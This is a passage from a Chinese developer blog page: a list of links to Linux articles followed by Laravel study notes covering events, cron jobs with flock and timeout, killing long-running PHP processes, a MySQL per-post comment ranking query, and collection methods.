<p><a href="https://neuqzxy.github.io/2017/07/08/wget%E7%9A%8415%E4%B8%AA%E9%9C%87%E6%92%BC%E7%9A%84%E4%BE%8B%E5%AD%90/" target="_blank" rel="noopener">wget的15个震撼的例子</a></p>
<p><a href="https://www.restran.net/2015/10/19/linux-practice-notes/" target="_blank" rel="noopener">Linux 踩坑记</a></p>
<p><a href="https://github.com/Nick233333/phper-linux-gitbook" target="_blank" rel="noopener">PHPer 必知必会的 Linux 命令</a></p>
<p><a href="https://github.com/jlevy/the-art-of-command-line" target="_blank" rel="noopener">命令行的艺术</a></p>
<p><a href="https://www.njphper.com/posts/680ebdf2.html" target="_blank" rel="noopener">Nginx 学习笔记时序图</a></p>
<p><a href="https://learnku.com/articles/28500" target="_blank" rel="noopener">Windows 10 安装体验</a></p>
<p><a href="https://coolshell.cn/articles/19219.html" target="_blank" rel="noopener">打造高效的工作环境 – SHELL 篇https://github.com/coolshellx/articles</a></p>
<p><a href="https://michael728.github.io/2018/07/05/linux-useful-commands-in-work/" target="_blank" rel="noopener">工作中常用的 Linux 命令</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/27/laravel-笔记/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="苏生不惑">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="苏生不惑的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/27/laravel-笔记/" itemprop="url">laravel 笔记</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-27T19:44:44+08:00">
                2019-03-27
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  28.2k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  135 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="事件的使用Laravel-启动流程分析"><a href="#事件的使用Laravel-启动流程分析" class="headerlink" title="事件的使用Laravel 启动流程分析"></a>事件的使用Laravel 启动流程分析</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">php artisan make:event UserRegistered</span><br><span class="line"></span><br><span class="line">php artisan make:listener SendWelcomeMail --event=UserRegistered</span><br><span class="line"></span><br><span class="line">php artisan make:listener UpdateReferrer --event=UserRegistered</span><br><span class="line">protected $listen = [ </span><br><span class="line">    UserRegistered::<span class="function"><span class="params">class</span> =&gt;</span> [ </span><br><span class="line">        SendWelcomeMail::<span class="class"><span class="keyword">class</span>, </span></span><br><span class="line">        UpdateReferrer::class,</span><br><span class="line">    ]</span><br><span class="line">];</span><br><span class="line">https:<span class="comment">//learnku.com/articles/26152</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">boot</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        parent::boot();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">static</span>::created(<span class="function"><span class="keyword">function</span> (<span class="params">User $user</span>) </span>&#123;</span><br><span class="line">            \event(<span class="keyword">new</span> UserRegistered($user));</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="cron-timeout"><a href="#cron-timeout" class="headerlink" title="cron timeout"></a>cron timeout</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">crontab定时启动任务，flock保证互斥，timeout设置超时以及报警脚本</span><br><span class="line">flock -xn /tmp/lock /path/to/php /path/to/file</span><br><span class="line">让我们再来重放一下故障场景：假如上一分钟的 A 请求还没退出，下一分钟的 B 请求也启动了，那么 B 请求会发现 A 请求还没有释放锁，于是它不会执行。</span><br><span class="line">假如因为某些无法预知的原因，导致脚本不能正常结束请求，进而导致不能正常释放锁，那么后续所有其它的 CD 等请求也都无法执行了，如何避免？答案是 timeout，它实现了超时控制机制：</span><br><span class="line">https:<span class="comment">//huoding.com/2016/12/12/573  https://juejin.im/post/5bb4fc0de51d450e597b6d51</span></span><br><span class="line">timeout -s SIGINT <span class="number">100</span> flock -xn /tmp/lock /path/to/php /path/to/file</span><br><span class="line">让我们再来重放一下故障场景：假如上一分钟的 A 请求还没退出，下一分钟的 B 请求也启动了，那么 B 请求会发现 A 的请求还没有释放锁，于是它不会执行，不过下下分钟的 C 请求肯定能执行，因为在这之前，A 请求已经因为超时被 timeout 干掉了。</span><br><span class="line"></span><br><span class="line"># 超时发送-9信号，超时执行后面的脚本输出failed</span><br><span class="line">timeout -s <span class="number">9</span> <span class="number">5</span> sleep <span class="number">20</span> || echo <span class="string">'failed'</span></span><br><span class="line"># 未超时执行后面的脚本输出success</span><br><span class="line">timeout -s <span class="number">9</span> <span class="number">10</span> sleep <span class="number">5</span> &amp;&amp; echo <span class="string">'success'</span></span><br><span class="line"> 需要注意的点</span><br><span class="line"></span><br><span class="line">timeout 正常结束的返回码是<span class="number">0</span></span><br><span class="line">timeout 超时kill结束的返回码是<span class="number">124</span></span><br><span class="line"></span><br><span class="line"> 假设<span class="number">6</span>分钟执行一次且互斥非阻塞，超时<span class="number">10</span>分钟且超时执行报警脚本，则最终crontab文件如下</span><br><span class="line"> *<span class="regexp">/6 * * * * cd /</span>data/projec &amp;&amp; flock -xn ./task.lock -c <span class="string">'timeout -9 600 sh task.sh || sh alarm.sh'</span></span><br><span class="line"> 需要注意的点</span><br><span class="line"> 如果task.sh启动了子进程进行处理，则需要在task.sh的末尾加上wait命令等待全部子进程完成才结束，否则timeout无效</span><br><span class="line"> cd /data/project</span><br><span class="line"> nohub python3 main.py &gt;main.log <span class="number">2</span>&gt;&amp;<span class="number">1</span> &amp;</span><br><span class="line"> wait</span><br><span class="line"> https:<span class="comment">//juejin.im/post/5bb4fc0de51d450e597b6d51</span></span><br></pre></td></tr></table></figure>
<h3 id="杀死过期进程"><a href="#杀死过期进程" class="headerlink" title="杀死过期进程"></a>杀死过期进程</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">fire</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $pids = $<span class="keyword">this</span>-&gt;getPids([<span class="string">"php"</span>, <span class="string">"shell_lock"</span>]);</span><br><span class="line">            foreach ($pids <span class="keyword">as</span> $pid) &#123;</span><br><span class="line">                $startTime = $<span class="keyword">this</span>-&gt;getProcessStartTime($pid);</span><br><span class="line">                $<span class="keyword">this</span>-&gt;ifKill($startTime, $pid);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception $e) &#123;</span><br><span class="line">            Log::error(<span class="string">"["</span> . ClientIp::getIp() . <span class="string">"][LONG TIME KILLER]: "</span> . $e-&gt;getMessage() . <span class="string">"\r\n"</span> . $e-&gt;getTraceAsString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected <span class="function"><span class="keyword">function</span> <span class="title">getPids</span>(<span class="params">$arr</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $command = <span class="string">"ps aux | grep -v grep "</span>;</span><br><span class="line">        foreach ($arr <span class="keyword">as</span> $word) &#123;</span><br><span class="line">            $command .= <span class="string">"| grep &#123;$word&#125;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $command .= <span class="string">" | awk '&#123;print $2&#125;'"</span>;</span><br><span class="line">        $result = shell_exec($command);</span><br><span class="line">        $result = trim($result);</span><br><span class="line">        <span class="keyword">if</span> (empty($result)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> explode(<span class="string">"\n"</span>, $result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected <span class="function"><span class="keyword">function</span> <span class="title">getProcessStartTime</span>(<span class="params">$pid</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">/*ps -p 18994 -o lstart</span></span><br><span class="line"><span class="comment">                           STARTED</span></span><br><span class="line"><span class="comment">          Thu Mar 21 10:25:38 2019</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        $command = <span class="string">"ps -p &#123;$pid&#125; -o lstart"</span>;</span><br><span class="line">        $result = shell_exec($command);</span><br><span class="line">        $result = trim(str_replace(<span class="string">"STARTED"</span>, <span class="string">""</span>, $result));</span><br><span class="line">        <span class="keyword">if</span> (empty($result)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $ctime = \Carbon\Carbon::createFromFormat(<span class="string">"D M j H:i:s Y"</span>, $result);</span><br><span class="line">        <span class="keyword">return</span> $ctime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected <span class="function"><span class="keyword">function</span> <span class="title">ifKill</span>(<span class="params">Carbon $ctime, $pid</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($ctime-&gt;lt(\Carbon\Carbon::now()-&gt;addHours(<span class="number">-1</span>))) &#123;</span><br><span class="line">            $cmd = file_get_contents(<span class="string">"/proc/&#123;$pid&#125;/cmdline"</span>);</span><br><span class="line">            $logString =   Carbon::now()-&gt;toDateTimeString() . <span class="string">"]Killing pid &#123;$pid&#125; started at "</span> . $ctime-&gt;toDateTimeString() . <span class="string">" lasts for more than 1 hour, start script is `"</span> . $cmd . <span class="string">"`"</span>;</span><br><span class="line">            \Log::info($logString);</span><br><span class="line">            shell_exec(<span class="string">"kill -9 &#123;$pid&#125;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pid <span class="keyword">in</span> $(ps aux|grep <span class="string">'artisan   '</span> | grep -v grep | awk <span class="string">'&#123;print $2&#125;'</span>); <span class="keyword">do</span> kill <span class="number">-9</span> $pid; done</span><br><span class="line">ps -ef | pgrep -f <span class="string">"search"</span> | xargs kill <span class="number">-9</span></span><br></pre></td></tr></table></figure>
<h3 id="每个文章的前10条评论一同查询出来"><a href="#每个文章的前10条评论一同查询出来" class="headerlink" title="每个文章的前10条评论一同查询出来"></a>每个文章的前10条评论一同查询出来</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$posts = Post::paginate(<span class="number">15</span>);</span><br><span class="line"></span><br><span class="line">$postIds = $posts-&gt;pluck(<span class="string">'id'</span>)-&gt;all();</span><br><span class="line"></span><br><span class="line"><span class="comment">//找出符合条件的 comments ，同时定义 @post, @rank 变量，这里没有用 all,get 等函数，此时并不会执行 SQL 语句。</span></span><br><span class="line">$sub = Comment::whereIn(<span class="string">'post_id'</span>,$postIds)-&gt;select(DB::raw(<span class="string">'*,@post := NULL ,@rank := 0'</span>))-&gt;orderBy(<span class="string">'post_id'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//把上面构造的 sql 查询作为子表进行查询，根据 post_id 进行分区的同时 @rank 变量不断+1</span></span><br><span class="line">$sub2 = DB::table( DB::raw(<span class="string">"(&#123;$sub-&gt;toSql()&#125;) as b"</span>) )</span><br><span class="line">            -&gt;mergeBindings($sub-&gt;getQuery())</span><br><span class="line">            -&gt;select(DB::raw(<span class="string">'b.*,IF (</span></span><br><span class="line"><span class="string">            @post = b.post_id ,@rank :=@rank + 1 ,@rank := 1</span></span><br><span class="line"><span class="string">        ) AS rank,</span></span><br><span class="line"><span class="string">        @post := b.post_id'</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//取出符合条件的前10条comment</span></span><br><span class="line">$commentIds = DB::table( DB::raw(<span class="string">"(&#123;$sub2-&gt;toSql()&#125;) as c"</span>) )</span><br><span class="line">            -&gt;mergeBindings($sub2)</span><br><span class="line">        -&gt;where(<span class="string">'rank'</span>,<span class="string">'&lt;'</span>,<span class="number">11</span>)-&gt;select(<span class="string">'c.id'</span>)-&gt;pluck(<span class="string">'id'</span>)-&gt;toArray();</span><br><span class="line"></span><br><span class="line">$comments = Comment::whereIn(<span class="string">'id'</span>,$commentIds)-&gt;get();</span><br><span class="line"></span><br><span class="line">$posts = $posts-&gt;each(<span class="function"><span class="keyword">function</span> (<span class="params">$item, $key</span>) <span class="title">use</span> (<span class="params">$comments</span>) </span>&#123;</span><br><span class="line">    $item-&gt;comments = $comments-&gt;where(<span class="string">'post_id'</span>,$item-&gt;id);</span><br><span class="line">&#125;);</span><br><span class="line">会产生三条sql https:<span class="comment">//learnku.com/articles/20315</span></span><br><span class="line">select * <span class="keyword">from</span> <span class="string">`posts`</span> limit <span class="number">15</span> offset <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">select <span class="string">`c`</span>.<span class="string">`id`</span> <span class="keyword">from</span> (select b.*,IF (</span><br><span class="line">@post = b.post_id ,@rank :=@rank + <span class="number">1</span> ,@rank := <span class="number">1</span></span><br><span class="line">) AS rank,</span><br><span class="line">@post := b.post_id <span class="keyword">from</span> (select *,@post := NULL ,@rank := <span class="number">0</span> <span class="keyword">from</span> <span class="string">`comments`</span> where <span class="string">`post_id`</span> <span class="keyword">in</span> (<span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>, <span class="string">'10'</span>, <span class="string">'11'</span>, <span class="string">'12'</span>, <span class="string">'13'</span>, <span class="string">'14'</span>, <span class="string">'15'</span>, <span class="string">'16'</span>) order by <span class="string">`post_id`</span> asc) <span class="keyword">as</span> b) <span class="keyword">as</span> c where <span class="string">`rank`</span> &lt; <span class="string">'11'</span>;</span><br><span class="line"></span><br><span class="line">select * <span class="keyword">from</span> <span class="string">`comments`</span> where <span class="string">`id`</span> <span class="keyword">in</span> (<span class="string">'180'</span>, <span class="string">'589'</span>, <span class="string">'590'</span>, <span class="string">'3736'</span>);</span><br></pre></td></tr></table></figure>
<h3 id="Laravel-集合"><a href="#Laravel-集合" class="headerlink" title="Laravel 集合"></a>Laravel 集合</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//learnku.com/laravel/t/26110</span></span><br><span class="line"></span><br><span class="line">  $users = User::all();</span><br><span class="line">        $users-&gt;contains(<span class="string">'name'</span>, <span class="string">'Chasity Tillman'</span>);</span><br><span class="line">        <span class="comment">//true</span></span><br><span class="line"></span><br><span class="line">        $collection = collect([<span class="string">'name'</span> =&gt; <span class="string">'John'</span>, <span class="string">'age'</span> =&gt; <span class="number">23</span>]);</span><br><span class="line">        $collection-&gt;contains(<span class="string">'Jane'</span>);</span><br><span class="line">        <span class="comment">//false</span></span><br><span class="line"></span><br><span class="line">        $collection = collect([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]);</span><br><span class="line">        $collection-&gt;contains(<span class="function"><span class="keyword">function</span> (<span class="params">$key, $value</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> $value &lt;= <span class="number">5</span>;</span><br><span class="line">            <span class="comment">//true</span></span><br><span class="line">        &#125;);</span><br><span class="line"> $users = User::all();</span><br><span class="line">        $youngsters = $users-&gt;filter(<span class="function"><span class="keyword">function</span> (<span class="params">$value, $key</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> $value-&gt;age &lt; <span class="number">35</span>;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        $youngsters-&gt;all();</span><br><span class="line">        <span class="comment">// 所有年龄小于 35 的用户</span></span><br><span class="line">        $movies = collect([</span><br><span class="line">                    [</span><br><span class="line">                        <span class="string">'name'</span> =&gt; <span class="string">'Back To The Future'</span>,</span><br><span class="line">                        <span class="string">'releases'</span> =&gt; [<span class="number">1985</span>, <span class="number">1989</span>, <span class="number">1990</span>]</span><br><span class="line">                    ],</span><br><span class="line">                    [</span><br><span class="line">                        <span class="string">'name'</span> =&gt; <span class="string">'Fast and Furious'</span>,</span><br><span class="line">                        <span class="string">'releases'</span> =&gt; [<span class="number">2001</span>, <span class="number">2003</span>, <span class="number">2006</span>, <span class="number">2009</span>, <span class="number">2011</span>, <span class="number">2013</span>, <span class="number">2015</span>, <span class="number">2017</span>]</span><br><span class="line">                    ],</span><br><span class="line">                    [</span><br><span class="line">                        <span class="string">'name'</span> =&gt; <span class="string">'Speed'</span>,</span><br><span class="line">                        <span class="string">'releases'</span> =&gt; [<span class="number">1994</span>]</span><br><span class="line">                    ]</span><br><span class="line">                ]);</span><br><span class="line">        </span><br><span class="line">                $mostReleases = $movies-&gt;sortByDesc(<span class="function"><span class="keyword">function</span> (<span class="params">$movie, $key</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> count($movie[<span class="string">'releases'</span>]);</span><br><span class="line">                &#125;);</span><br><span class="line">        </span><br><span class="line">                $mostReleases-&gt;toArray();</span><br><span class="line">                <span class="comment">//列出以上映总数降序排序的电影</span></span><br><span class="line">        </span><br><span class="line">                dd($mostReleases-&gt;values()-&gt;toArray());</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                   列出以上映总数降序排序的电影并重置键值</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">                 $movies = collect([</span><br><span class="line">                            [<span class="string">'name'</span> =&gt; <span class="string">'Back To the Future'</span>, <span class="string">'genre'</span> =&gt; <span class="string">'scifi'</span>, <span class="string">'rating'</span> =&gt; <span class="number">8</span>],</span><br><span class="line">                            [<span class="string">'name'</span> =&gt; <span class="string">'The Matrix'</span>,  <span class="string">'genre'</span> =&gt; <span class="string">'fantasy'</span>, <span class="string">'rating'</span> =&gt; <span class="number">9</span>],</span><br><span class="line">                            [<span class="string">'name'</span> =&gt; <span class="string">'The Croods'</span>,  <span class="string">'genre'</span> =&gt; <span class="string">'animation'</span>, <span class="string">'rating'</span> =&gt; <span class="number">8</span>],</span><br><span class="line">                            [<span class="string">'name'</span> =&gt; <span class="string">'Zootopia'</span>,  <span class="string">'genre'</span> =&gt; <span class="string">'animation'</span>, <span class="string">'rating'</span> =&gt; <span class="number">4</span>],</span><br><span class="line">                            [<span class="string">'name'</span> =&gt; <span class="string">'The Jungle Book'</span>,  <span class="string">'genre'</span> =&gt; <span class="string">'fantasy'</span>, <span class="string">'rating'</span> =&gt; <span class="number">5</span>],</span><br><span class="line">                        ]);</span><br><span class="line">                </span><br><span class="line">                        $genre = $movies-&gt;groupBy(<span class="string">'genre'</span>);</span><br><span class="line">                        <span class="comment">/*</span></span><br><span class="line"><span class="comment">                        [</span></span><br><span class="line"><span class="comment">                             "scifi" =&gt; [</span></span><br><span class="line"><span class="comment">                               ["name" =&gt; "Back To the Future", "genre" =&gt; "scifi", "rating" =&gt; 8,],</span></span><br><span class="line"><span class="comment">                             ],</span></span><br><span class="line"><span class="comment">                             "fantasy" =&gt; [</span></span><br><span class="line"><span class="comment">                               ["name" =&gt; "The Matrix", "genre" =&gt; "fantasy", "rating" =&gt; 9,],</span></span><br><span class="line"><span class="comment">                               ["name" =&gt; "The Jungle Book", "genre" =&gt; "fantasy", "rating" =&gt; 5, ],</span></span><br><span class="line"><span class="comment">                             ],</span></span><br><span class="line"><span class="comment">                             "animation" =&gt; [</span></span><br><span class="line"><span class="comment">                               ["name" =&gt; "The Croods", "genre" =&gt; "animation", "rating" =&gt; 8,],</span></span><br><span class="line"><span class="comment">                               ["name" =&gt; "Zootopia", "genre" =&gt; "animation", "rating" =&gt; 4, ],</span></span><br><span class="line"><span class="comment">                             ],</span></span><br><span class="line"><span class="comment">                        ]</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">                </span><br><span class="line">                        $rating = $movies-&gt;groupBy(<span class="function"><span class="keyword">function</span> (<span class="params">$movie, $key</span>) </span>&#123;</span><br><span class="line">                            <span class="keyword">return</span> $movie[<span class="string">'rating'</span>];</span><br><span class="line">                        &#125;);</span><br><span class="line">                </span><br><span class="line">                        <span class="comment">/*</span></span><br><span class="line"><span class="comment">                        [</span></span><br><span class="line"><span class="comment">                           8 =&gt; [</span></span><br><span class="line"><span class="comment">                             ["name" =&gt; "Back To the Future", "genre" =&gt; "scifi", "rating" =&gt; 8,],</span></span><br><span class="line"><span class="comment">                             ["name" =&gt; "The Croods", "genre" =&gt; "animation", "rating" =&gt; 8,],</span></span><br><span class="line"><span class="comment">                           ],</span></span><br><span class="line"><span class="comment">                           9 =&gt; [</span></span><br><span class="line"><span class="comment">                             ["name" =&gt; "The Matrix", "genre" =&gt; "fantasy", "rating" =&gt; 9,],</span></span><br><span class="line"><span class="comment">                           ],</span></span><br><span class="line"><span class="comment">                           4 =&gt; [</span></span><br><span class="line"><span class="comment">                             ["name" =&gt; "Zootopia","genre" =&gt; "animation", "rating" =&gt; 4,],</span></span><br><span class="line"><span class="comment">                           ],</span></span><br><span class="line"><span class="comment">                           5 =&gt; [</span></span><br><span class="line"><span class="comment">                             ["name" =&gt; "The Jungle Book","genre" =&gt; "fantasy","rating" =&gt; 5,],</span></span><br><span class="line"><span class="comment">                           ],</span></span><br><span class="line"><span class="comment">                        ]</span></span><br><span class="line"><span class="comment">                       */</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    $list = collect([</span><br><span class="line">                                <span class="string">'Albert'</span>, <span class="string">'Ben'</span>, <span class="string">'Charles'</span>, <span class="string">'Dan'</span>, <span class="string">'Eric'</span>, <span class="string">'Xavier'</span>, <span class="string">'Yuri'</span>, <span class="string">'Zane'</span></span><br><span class="line">                            ]);</span><br><span class="line">                    </span><br><span class="line">                            <span class="comment">//获取前两个名字</span></span><br><span class="line">                            $firstTwo = $list-&gt;take(<span class="number">2</span>);</span><br><span class="line">                            <span class="comment">//['Albert', 'Ben']</span></span><br><span class="line">                    </span><br><span class="line">                            <span class="comment">//获取最后两个名字</span></span><br><span class="line">                            $lastTwo = $list-&gt;take(<span class="number">-2</span>);</span><br><span class="line">                            <span class="comment">//['Yuri', 'Zane']</span></span><br><span class="line">                            $list = collect([</span><br><span class="line">                                        <span class="string">'Albert'</span>, <span class="string">'Ben'</span>, <span class="string">'Charles'</span>, <span 